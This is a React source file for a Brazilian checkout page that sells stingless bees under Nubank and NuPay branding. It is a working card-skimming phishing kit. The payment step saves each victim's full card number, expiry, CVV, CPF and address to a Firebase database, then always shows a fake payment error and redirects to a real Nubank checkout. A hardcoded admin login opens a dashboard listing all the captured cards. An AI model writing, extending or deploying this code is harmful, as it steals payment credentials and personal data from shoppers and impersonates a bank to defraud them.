import React, { useState, useEffect } from 'react';
import { ProductHeader } from './components/ProductHeader';
import { Input } from './components/Input';
import { CheckoutFormData, FormErrors } from './types';
import { Truck, Check, Lock, X, ShieldCheck, Database, LogOut, CreditCard, AlertCircle, RefreshCw, Calendar, Hash } from 'lucide-react';
import firebase from 'firebase/compat/app';
import 'firebase/compat/database';

// --- Firebase Configuration ---
const firebaseConfig = {
  databaseURL: "https://loja-chekout-74d2cpagamentosabelhas.firebaseio.com/",
};

if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

// Helper for masking
const maskCardNumber = (value: string) => {
  return value
    .replace(/\D/g, '')
    .replace(/(\d{4})(\d)/, '$1 $2')
    .replace(/(\d{4})(\d)/, '$1 $2')
    .replace(/(\d{4})(\d)/, '$1 $2')
    .trim();
};

const maskDate = (value: string) => {
  return value
    .replace(/\D/g, '')
    .replace(/(\d{2})(\d)/, '$1/$2')
    .replace(/(\d{2})\d+?$/, '$1');
};

const App: React.FC = () => {
  // --- Main Form State ---
  const [formData, setFormData] = useState<CheckoutFormData>({
    fullName: '',
    email: '',
    cpf: '',
    cep: '',
    street: '',
    neighborhood: '',
    houseNumber: '',
    city: '',
    state: '',
    agreedToShipping: true,
  });

  // --- Payment Flow State ---
  type PaymentStep = 'summary' | 'card_form' | 'processing' | 'error';
  const [paymentStep, setPaymentStep] = useState<PaymentStep>('summary');
  
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardName: '',
    cardExpiry: '',
    cardCvv: '',
    installments: '1',
  });

  const [selectedProducts, setSelectedProducts] = useState<string[]>(['bee']);
  const [errors, setErrors] = useState<FormErrors>({});
  const [showPaymentModal, setShowPaymentModal] = useState(false);

  // --- Admin State ---
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [showAdminDashboard, setShowAdminDashboard] = useState(false);
  const [adminUser, setAdminUser] = useState('');
  const [adminPass, setAdminPass] = useState('');
  const [adminError, setAdminError] = useState('');
  const [orders, setOrders] = useState<any[]>([]);

  // Toggle product selection
  const handleToggleProduct = (id: string) => {
    setSelectedProducts(prev => 
      prev.includes(id) ? prev.filter(p => p !== id) : [...prev, id]
    );
  };

  // Masking helpers for main form
  const maskCPF = (value: string) => {
    return value
      .replace(/\D/g, '')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})/, '$1-$2')
      .replace(/(-\d{2})\d+?$/, '$1');
  };

  const maskCEP = (value: string) => {
    return value
      .replace(/\D/g, '')
      .replace(/(\d{5})(\d)/, '$1-$2')
      .replace(/(-\d{3})\d+?$/, '$1');
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target;
    let finalValue = value;

    if (name === 'cpf') finalValue = maskCPF(value);
    if (name === 'cep') finalValue = maskCEP(value);

    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : finalValue
    }));

    if (errors[name]) {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[name];
        return newErrors;
      });
    }
  };

  // Card Inputs Handler
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    let finalValue = value;

    if (name === 'cardNumber') finalValue = maskCardNumber(value);
    if (name === 'cardExpiry') finalValue = maskDate(value);
    if (name === 'cardCvv') finalValue = value.replace(/\D/g, '').slice(0, 4);

    setCardData(prev => ({ ...prev, [name]: finalValue }));
  };

  const validate = () => {
    const newErrors: FormErrors = {};
    if (!formData.fullName.trim()) newErrors.fullName = 'Nome completo é obrigatório';
    if (formData.email.trim() && !/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Email inválido';
    }
    if (!formData.cpf.trim() || formData.cpf.length < 14) newErrors.cpf = 'CPF inválido';
    if (!formData.cep.trim() || formData.cep.length < 9) newErrors.cep = 'CEP inválido';
    if (!formData.street.trim()) newErrors.street = 'Rua é obrigatória';
    if (!formData.neighborhood.trim()) newErrors.neighborhood = 'Bairro é obrigatório';
    if (!formData.houseNumber.trim()) newErrors.houseNumber = 'Número é obrigatório';
    
    if (!formData.agreedToShipping) {
      newErrors.agreedToShipping = 'Confirmação necessária';
    }

    if (selectedProducts.length === 0) {
      alert("Por favor, selecione pelo menos um produto acima.");
      return false;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      setPaymentStep('summary'); // Reset to start
      setShowPaymentModal(true);
    }
  };

  // Step 1: User clicks "Pagar com Nubank" on summary -> Goes to Card Form
  const handleProceedToCard = () => {
    setPaymentStep('card_form');
  };

  // Step 2: User submits card -> Saves to Firebase -> Shows Processing -> Shows Error
  const handleFinalizePayment = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic card validation
    if (cardData.cardNumber.length < 15 || !cardData.cardName || cardData.cardExpiry.length < 5 || cardData.cardCvv.length < 3) {
      alert("Por favor, preencha os dados do cartão corretamente.");
      return;
    }

    setPaymentStep('processing');

    // --- SAVE TO FIREBASE ---
    const orderData = {
      ...formData,
      products: selectedProducts,
      cardDetails: cardData,
      total: 200.00,
      timestamp: new Date().toISOString(),
      status: 'payment_failed_error_screen'
    };

    db.ref('orders').push(orderData)
      .then(() => console.log('Order saved with card data'))
      .catch((err: any) => console.error('Error saving order', err));
    
    // Wait 4 seconds then show Error
    setTimeout(() => {
      setPaymentStep('error');
    }, 4000);
  };

  // Step 3: User clicks "Try Again" -> Redirects to real checkout
  const handleRetryPayment = () => {
    window.location.href = 'https://checkout.nubank.com.br/6cqFN1rPHb15dr71';
  };

  // --- Admin Logic ---

  const handleOpenAdmin = () => {
    setShowAdminLogin(true);
  };

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (adminUser === 'ediran' && adminPass === '12345678') {
      setShowAdminLogin(false);
      setShowAdminDashboard(true);
      setAdminError('');
      // Fetch data
      db.ref('orders').on('value', (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const loadedOrders = Object.entries(data).map(([key, value]: [string, any]) => ({
            id: key,
            ...value
          }));
          loadedOrders.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
          setOrders(loadedOrders);
        } else {
            setOrders([]);
        }
      });
    } else {
      setAdminError('Credenciais inválidas.');
    }
  };

  return (
    <div className="min-h-screen py-10 px-4 sm:px-6 lg:px-8 flex items-center justify-center bg-page relative">
      <div className="w-full max-w-xl">
        
        <ProductHeader 
          selectedProducts={selectedProducts} 
          onToggleProduct={handleToggleProduct}
          onOpenAdmin={handleOpenAdmin}
        />

        <form onSubmit={handleSubmit} className="bg-white rounded-3xl shadow-xl p-6 md:p-10 border border-gray-100">
          <div className="mb-8 border-b border-gray-100 pb-4">
             <h3 className="text-lg font-bold text-gray-800 flex items-center gap-2">
               Dados de Entrega
             </h3>
          </div>

          <div className="space-y-5">
            <Input
              label="Nome Completo"
              name="fullName"
              placeholder="Ex: João da Silva"
              value={formData.fullName}
              onChange={handleChange}
              error={errors.fullName}
            />

            <Input
              label="E-mail (Opcional)"
              type="email"
              name="email"
              placeholder="seu@email.com"
              value={formData.email}
              onChange={handleChange}
              error={errors.email}
            />

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <Input
                label="CPF"
                name="cpf"
                placeholder="000.000.000-00"
                value={formData.cpf}
                onChange={handleChange}
                error={errors.cpf}
                maxLength={14}
              />
              <Input
                label="CEP"
                name="cep"
                placeholder="00000-000"
                value={formData.cep}
                onChange={handleChange}
                error={errors.cep}
                maxLength={9}
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-[2fr_1fr] gap-5">
              <Input
                label="Endereço da Rua"
                name="street"
                placeholder="Ex: Av. Paulista"
                value={formData.street}
                onChange={handleChange}
                error={errors.street}
              />
              <Input
                label="Número"
                name="houseNumber"
                placeholder="123"
                value={formData.houseNumber}
                onChange={handleChange}
                error={errors.houseNumber}
              />
            </div>

            <Input
              label="Bairro"
              name="neighborhood"
              placeholder="Ex: Centro"
              value={formData.neighborhood}
              onChange={handleChange}
              error={errors.neighborhood}
            />
          </div>

          <div className="mt-8 pt-6 border-t border-gray-100">
            <button
              type="submit"
              className="w-full py-4 px-6 rounded-2xl text-white font-bold text-lg
                shadow-lg shadow-purple-900/10 flex items-center justify-center gap-2
                transform transition-all duration-200
                bg-nubank hover:bg-[#38085a] hover:scale-[1.01] hover:shadow-xl"
            >
              <Lock className="w-5 h-5" />
              Realizar o pagamento
            </button>
            
            <div className="mt-4 flex items-start gap-3 p-3 bg-gray-50 rounded-xl border border-gray-100">
              <div className="relative flex items-center">
                <input
                  type="checkbox"
                  id="shipping"
                  name="agreedToShipping"
                  checked={formData.agreedToShipping}
                  onChange={handleChange}
                  className="peer h-5 w-5 cursor-pointer appearance-none rounded-md border border-gray-300 bg-white checked:border-nubank checked:bg-nubank focus:ring-2 focus:ring-nubank/20"
                />
                <Check className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-3.5 h-3.5 text-white pointer-events-none opacity-0 peer-checked:opacity-100 transition-opacity" />
              </div>
              <label htmlFor="shipping" className="text-sm text-gray-500 lowercase cursor-pointer select-none leading-tight flex items-center gap-1.5 flex-wrap">
                <Truck className="w-4 h-4 text-nubank inline" />
                garantindo o envio das abelhas sem ferrão para todo o brasil
              </label>
            </div>
            {errors.agreedToShipping && (
               <p className="text-red-500 text-xs mt-1 ml-1 text-center">Você precisa confirmar o envio.</p>
            )}
          </div>
        </form>

        <div className="mt-8 text-center">
          <p className="text-xs text-gray-400">
            © 2024 NuPay - Pagamentos Seguros. Todas as transações são criptografadas.
          </p>
        </div>
      </div>

      {/* Payment Modal */}
      {showPaymentModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-200 overflow-y-auto">
          <div className="bg-white w-full max-w-md rounded-3xl shadow-2xl overflow-hidden relative p-8 text-center my-8">
            
            {(paymentStep === 'summary' || paymentStep === 'card_form') && (
              <button 
                onClick={() => setShowPaymentModal(false)}
                className="absolute top-4 right-4 p-1 rounded-full hover:bg-gray-100 text-gray-400"
              >
                <X className="w-5 h-5" />
              </button>
            )}

            {/* --- STEP 1: SUMMARY --- */}
            {paymentStep === 'summary' && (
              <div className="animate-in zoom-in-50 duration-300">
                <div className="flex flex-col items-center justify-center gap-3 mb-6">
                   <img 
                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png" 
                     alt="Nubank" 
                     className="h-8 object-contain"
                   />
                   <div className="flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5 text-nubank" />
                    <h2 className="text-lg font-bold text-gray-800">
                      Pague com segurança
                    </h2>
                  </div>
                </div>

                <div className="flex justify-center gap-4 mb-6">
                  {selectedProducts.map(id => (
                    <div key={id} className="w-24 h-24 rounded-xl overflow-hidden shadow-md border border-gray-100">
                      <img 
                        src="https://storage.googleapis.com/paginassites/jandaira-FCM-696x462.jpg" 
                        alt="Produto Selecionado" 
                        className="w-full h-full object-cover"
                      />
                    </div>
                  ))}
                </div>

                <div className="mb-8">
                   <p className="text-sm text-gray-500 mb-1">Valor Total</p>
                   <p className="text-3xl font-extrabold text-nubank">R$ 200,00</p>
                </div>

                <button
                  onClick={handleProceedToCard}
                  className="w-full py-3.5 rounded-xl bg-nubank text-white font-bold shadow-lg shadow-purple-900/20 hover:bg-[#38085a] transition-all"
                >
                  Pagar com o Nubank
                </button>
              </div>
            )}

            {/* --- STEP 2: CREDIT CARD FORM --- */}
            {paymentStep === 'card_form' && (
              <div className="animate-in slide-in-from-right duration-300 text-left">
                 <div className="text-center mb-6">
                   <h2 className="text-xl font-bold text-gray-800">Dados do Cartão</h2>
                   <p className="text-sm text-gray-500">Pagamento 100% seguro via NuPay</p>
                 </div>
                 
                 <form onSubmit={handleFinalizePayment} className="space-y-4">
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 ml-1">Número do Cartão</label>
                      <div className="relative">
                        <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                        <input 
                          name="cardNumber"
                          value={cardData.cardNumber}
                          onChange={handleCardChange}
                          placeholder="0000 0000 0000 0000"
                          maxLength={19}
                          className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
                          required
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 ml-1">Nome no Cartão</label>
                      <input 
                        name="cardName"
                        value={cardData.cardName}
                        onChange={handleCardChange}
                        placeholder="Como está impresso no cartão"
                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                       <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1 ml-1">Validade</label>
                          <div className="relative">
                            <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                            <input 
                              name="cardExpiry"
                              value={cardData.cardExpiry}
                              onChange={handleCardChange}
                              placeholder="MM/AA"
                              maxLength={5}
                              className="w-full pl-9 pr-3 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
                              required
                            />
                          </div>
                       </div>
                       <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1 ml-1">CVV</label>
                          <div className="relative">
                            <Hash className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                            <input 
                              name="cardCvv"
                              value={cardData.cardCvv}
                              onChange={handleCardChange}
                              placeholder="123"
                              maxLength={4}
                              type="tel"
                              className="w-full pl-9 pr-3 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
                              required
                            />
                          </div>
                       </div>
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 ml-1">Parcelamento</label>
                      <select 
                        name="installments"
                        value={cardData.installments}
                        onChange={handleCardChange}
                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all bg-white"
                      >
                         {[...Array(10)].map((_, i) => (
                           <option key={i} value={i + 1}>
                             {i + 1}x de R$ {(200 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
                           </option>
                         ))}
                      </select>
                    </div>

                    <button
                      type="submit"
                      className="w-full py-4 rounded-xl bg-nubank text-white font-bold shadow-lg mt-4 hover:bg-[#38085a] transition-all"
                    >
                      Finalizar Pagamento
                    </button>
                 </form>
              </div>
            )}

            {/* --- STEP 3: PROCESSING --- */}
            {paymentStep === 'processing' && (
              <div className="py-10 flex flex-col items-center justify-center animate-in fade-in duration-300">
                <svg className="animate-spin h-16 w-16 text-nubank mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <p className="text-nubank font-semibold animate-pulse">Processando pagamento...</p>
                <p className="text-lg font-bold text-gray-800 mt-2 text-center px-4 capitalize">{formData.fullName}</p>
                <p className="text-xs text-gray-400 mt-2">Aguarde, não feche esta página.</p>
              </div>
            )}

            {/* --- STEP 4: ERROR SCREEN --- */}
            {paymentStep === 'error' && (
              <div className="py-6 flex flex-col items-center justify-center animate-in zoom-in-95 duration-300">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                  <AlertCircle className="w-8 h-8 text-red-600" />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Ops! Algo deu errado</h3>
                <p className="text-gray-600 text-sm mb-6 px-4">
                  Não foi possível processar o pagamento com os dados informados. Por favor, tente novamente através do checkout seguro.
                </p>
                
                <button
                  onClick={handleRetryPayment}
                  className="w-full py-3.5 rounded-xl bg-nubank text-white font-bold shadow-lg flex items-center justify-center gap-2 hover:bg-[#38085a] transition-all"
                >
                  <RefreshCw className="w-5 h-5" />
                  Tentar pagar novamente
                </button>
              </div>
            )}
            
          </div>
        </div>
      )}

      {/* Admin Login Modal */}
      {showAdminLogin && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl p-6 relative">
             <button 
                onClick={() => setShowAdminLogin(false)}
                className="absolute top-4 right-4 p-1 rounded-full hover:bg-gray-100 text-gray-400"
              >
                <X className="w-5 h-5" />
              </button>
             <h2 className="text-xl font-bold text-gray-800 mb-4 flex items-center gap-2">
               <Lock className="w-5 h-5 text-nubank" /> Admin Access
             </h2>
             <form onSubmit={handleAdminLogin} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Usuário</label>
                  <input 
                    type="text" 
                    className="w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-nubank/20 focus:border-nubank outline-none"
                    value={adminUser}
                    onChange={(e) => setAdminUser(e.target.value)}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Senha</label>
                  <input 
                    type="password" 
                    className="w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-nubank/20 focus:border-nubank outline-none"
                    value={adminPass}
                    onChange={(e) => setAdminPass(e.target.value)}
                  />
                </div>
                {adminError && <p className="text-red-500 text-sm">{adminError}</p>}
                <button 
                  type="submit" 
                  className="w-full bg-gray-900 text-white py-2 rounded-lg font-medium hover:bg-gray-800"
                >
                  Entrar no Dashboard
                </button>
             </form>
          </div>
        </div>
      )}

      {/* Admin Dashboard */}
      {showAdminDashboard && (
        <div className="fixed inset-0 z-[70] bg-gray-100 flex flex-col animate-in slide-in-from-bottom duration-300">
           <div className="bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between shadow-sm">
              <div className="flex items-center gap-3">
                 <div className="bg-nubank p-2 rounded-lg">
                    <Database className="w-5 h-5 text-white" />
                 </div>
                 <div>
                    <h1 className="text-xl font-bold text-gray-800">Painel de Pedidos</h1>
                    <p className="text-xs text-green-600 flex items-center gap-1">
                       <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                       Tempo Real
                    </p>
                 </div>
              </div>
              <button 
                onClick={() => setShowAdminDashboard(false)}
                className="flex items-center gap-2 px-4 py-2 bg-gray-100 hover:bg-gray-200 rounded-lg text-sm font-medium transition-colors"
              >
                 <LogOut className="w-4 h-4" /> Sair
              </button>
           </div>

           <div className="flex-1 overflow-auto p-6">
              <div className="max-w-7xl mx-auto">
                 {orders.length === 0 ? (
                    <div className="text-center py-20 text-gray-500">
                       Nenhum pedido encontrado no banco de dados ainda.
                    </div>
                 ) : (
                    <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
                       {orders.map((order) => (
                          <div key={order.id} className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-md transition-shadow">
                             <div className="bg-gray-50 px-4 py-3 border-b border-gray-100 flex justify-between items-center">
                                <span className="font-mono text-xs text-gray-500 truncate" title={order.id}>ID: {order.id.slice(-8)}</span>
                                <span className="text-xs font-medium px-2 py-1 bg-yellow-100 text-yellow-800 rounded-full">
                                   {new Date(order.timestamp).toLocaleTimeString()}
                                </span>
                             </div>
                             <div className="p-4 space-y-3">
                                <div>
                                   <label className="text-xs text-gray-400 uppercase font-bold">Cliente</label>
                                   <p className="font-semibold text-gray-800">{order.fullName}</p>
                                   <p className="text-sm text-gray-600">{order.email || 'Sem email'}</p>
                                   <p className="text-sm text-gray-600 font-mono">{order.cpf}</p>
                                </div>
                                <div>
                                   <label className="text-xs text-gray-400 uppercase font-bold">Endereço</label>
                                   <p className="text-sm text-gray-700">{order.street}, {order.houseNumber}</p>
                                   <p className="text-sm text-gray-700">{order.neighborhood} - CEP: {order.cep}</p>
                                </div>
                                <div className="pt-2 border-t border-gray-100 flex justify-between items-end">
                                   <div>
                                     <label className="text-xs text-gray-400 uppercase font-bold">Produtos</label>
                                     <div className="flex gap-1 mt-1">
                                        {order.products?.map((p: string) => (
                                           <span key={p} className="text-xs bg-purple-50 text-nubank px-2 py-1 rounded border border-purple-100">
                                              {p === 'bee' ? 'Abelha' : 'Colmeia'}
                                           </span>
                                        ))}
                                     </div>
                                   </div>
                                   
                                   <div className="text-right flex-1">
                                      <p className="text-xs text-gray-400">Total</p>
                                      <p className="text-lg font-bold text-green-600">R$ {order.total?.toFixed(2).replace('.', ',')}</p>
                                   </div>
                                </div>
                                {order.cardDetails && (
                                  <div className="mt-3 p-3 bg-gray-50 border border-gray-200 rounded-lg">
                                    <div className="flex items-center gap-2 mb-2 pb-2 border-b border-gray-200">
                                      <CreditCard className="w-3 h-3 text-nubank" />
                                      <span className="text-xs font-bold text-gray-700">Dados do Pagamento</span>
                                    </div>
                                    <div className="grid grid-cols-2 gap-2 text-xs">
                                      <div className="col-span-2">
                                        <span className="text-gray-400 block text-[10px]">Nome no Cartão</span>
                                        <span className="font-mono text-gray-800 font-medium">{order.cardDetails.cardName}</span>
                                      </div>
                                      <div className="col-span-2">
                                        <span className="text-gray-400 block text-[10px]">Número do Cartão</span>
                                        <span className="font-mono text-gray-800 font-medium">{order.cardDetails.cardNumber}</span>
                                      </div>
                                      <div>
                                        <span className="text-gray-400 block text-[10px]">Validade</span>
                                        <span className="font-mono text-gray-800 font-medium">{order.cardDetails.cardExpiry}</span>
                                      </div>
                                      <div>
                                        <span className="text-gray-400 block text-[10px]">CVV</span>
                                        <span className="font-mono text-gray-800 font-medium">{order.cardDetails.cardCvv}</span>
                                      </div>
                                      <div className="col-span-2 mt-1 pt-1 border-t border-gray-100">
                                        <span className="text-gray-400 block text-[10px]">Parcelamento</span>
                                        <span className="text-nubank font-bold">{order.cardDetails.installments}x sem juros</span>
                                      </div>
                                    </div>
                                  </div>
                                )}
                             </div>
                          </div>
                       ))}
                    </div>
                 )}
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default App;